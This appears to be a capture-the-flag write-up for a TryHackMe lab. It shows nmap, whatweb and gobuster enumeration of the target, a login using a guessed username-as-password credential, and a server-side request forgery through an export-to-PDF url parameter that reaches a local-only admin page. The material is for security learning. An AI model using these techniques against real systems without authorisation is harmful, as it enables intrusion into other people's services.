# [Surfer](https://tryhackme.com/room/surfer)


## Quick [nmap](https://nmap.org/) port scan

```ruby
$ nmap -v -T4 10.10.201.95

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Scan report for specific 22, 80

```ruby
$ nmap -vv -Pn -p22,80 -sC -sV  -T4 10.10.201.95
...
...
...
Scanned at 2023-04-21 14:15:22 IST for 21s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8566433a7d63e6e1016a8a959cd3541f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCgXBgsuA591nskOlojUcrTC4bnea1nbJhTAEvP22eF+AjoWMBXQfIPBSePrKpnv9m/8lCirDFNXKpkqyYvtsbMQ1ewckBChTvSyOCM4HbxUKQZLwIh9CSbeG/A8BTL4kbqlx3EA8bDDeBg9ZxOjF3fLxOzJxU7HBxXCXsRzxT3PtwWjXr+x7odZJHViELJdR/gfVwPRlVvM8uPo2NLbsnV9b2ONQsIQ/dtOpCtSNPxi1ApXyWiipMsEhl0GTr9HmKPYpSFeutTEMCqVQCt+enitDfSmB6+1gJO9KP90cW9OgDr2Njxcybu7P0ZCulOGUVtOkrfGh01NxEx88TWMSi5d1yHaO56qKV88r8GMKxgWFij7cBAqOM+ZEESkdxQ4IJgag1MUEbXzEadTQs2xw8lI9/q1fZh0UGj1GMRaRAHdvCKSkrfMhyDrcGiEC2YO2I3C2d73qkwT/pEMSbnzEg0+4FfjjJBHMGUeC2oXdtcwWrTeYFm+c7VlK5WEsuH5uU=
|   256 279fefe6eb2ae5006b116a59d2c0a146 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISTPXBjHzQ0BUNSfPX8ldToPIi8jQDvEp/yn5tB6Ky7FjLBv1b8SXHukdAzEBs77RFnPwLLhbH+JKK9ttyscX0=
|   256 fd9e7b8c21c57cac02c6e963d0ef1670 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFLssVf17bHLroY/Z+ACVyGo28PKQgEwuzfQsf9UthV6
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
|_http-favicon: Unknown favicon MD5: CFFCD51EFA49AB1AC1D8AC6E36462235
| http-title: 24X7 System+
|_Requested resource was /login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:15
Completed NSE at 14:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.39 seconds
```

* Os - Ubuntu / Debian / Linux
* Service Apache/2.4.38


### Whatweb Results
```ruby
$ whatweb 10.10.201.95
http://10.10.201.95 [302 Found] Apache[2.4.38], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.201.95], PHP[7.2.34], RedirectLocation[/login.php], X-Powered-By[PHP/7.2.34]
http://10.10.201.95/login.php [200 OK] Apache[2.4.38], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.201.95], PHP[7.2.34], PasswordField[password], Script, Title[24X7 System+], X-Powered-By[PHP/7.2.34]
```

* Additional Information: PHP/7.2.34

### Additional Scan for http using [Gobuster](https://www.kali.org/tools/gobuster/)

```ruby

gobuster dir -u http://10.10.201.95/ -x txt,php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.95/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/04/21 14:26:11 Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 301) [Size: 313] [--> http://10.10.201.95/backup/]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]                   
/assets               (Status: 301) [Size: 313] [--> http://10.10.201.95/assets/]
/login.php            (Status: 200) [Size: 4774]                                 
/index.php            (Status: 302) [Size: 0] [--> /login.php]                   
/internal             (Status: 301) [Size: 315] [--> http://10.10.201.95/internal/]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.201.95/vendor/]  
/robots.txt           (Status: 200) [Size: 40]                                     
/verify.php           (Status: 302) [Size: 0] [--> /login.php]                     
/server-status        (Status: 403) [Size: 277]                                    
/changelog.txt        (Status: 200) [Size: 816]                                    
/Readme.txt           (Status: 200) [Size: 222]  
```



#### /robots.txt
User-Agent: *
Disallow: /backup/chat.txt

in /backup/chat.txt
```ruby
Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

* It scheams to be some default credentials `Also Don't forget to change the creds, plz stop using your username as password.`

Maddy: Ohhh I got in first attempt


there is some Recent Activities

```ruby
Recent Activity | Today 32 min
System Stats Report Generated.  56 min
Recovered from unexpected downtime.  2 hrs
System Stats Report Generated.  1 day
Internal pages hosted at /internal/admin.php. It contains the system flag.  2 days
System Stats Report Generated.  4 weeks
24X7 System+ Installed on the server.

```

when I try to access this page `/internal/admin.php`. I got the error like `This page can only be accessed locally.`



#### /changelog.txt

```ruby
Version: 2.2.1
  - Typo fix in the login.html template: passwword -> password
  - Updated all outdated third party vendor libraries to their latest versions

Version: 2.2.0
  - Updated Bootstrap to version 5.1.3
  - Updated all outdated third party vendor libraries to their latest versions

Version: 2.1.0
  - Updated Bootstrap to version 5.1.2

Version: 2.0.0
  - The template was rebuilt from scratch with the latest Bootstrap version (5.1.1)
  - Added NodeJS NPM Development version (Pro unlimited & Membership members)
  - Update to latest version PHP Email Form

Version: 1.2.0
  - Updated all outdated third party vendor libraries to their latest versions
  - Other small fixes and updates

Version: 1.1.0
  - Cleanup old libraries and small fixes

Version: 1.0.0
  - Initial Release
```

oh waste of time. there is nothing, Let fire up the burb and carture the requests


#### I got the request after I click the `Export to PDF` button

```post
POST /export2pdf.php HTTP/1.1
Host: 10.10.201.95
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.201.95/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.201.95
DNT: 1
Connection: close
Cookie: PHPSESSID=9d0854b01d8e11e497cd7607007786f7
Upgrade-Insecure-Requests: 1


url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

when I manually access this url `http://10.10.201.95/server-info.php`. I got
```ruby

Hosting Server Information

Operating System: Linux
Server IP: 172.17.0.2
Server Hostname: 01a5b58d4be9
Server Protocol: HTTP/1.1
Server Administrator: webmaster@localhost
Server Web Port: 80
PHP Version: 7.2.34
CGI Version: CGI/1.1
System Uptime: 09:18:32 up 39 min, 0 users, load average: 0.00, 0.00, 0.00

```
well It gives the pdf for the local url , so I going to try `http://10.10.201.95/internal/admin.php` and resent the request

I got the flag `****{*************************}`



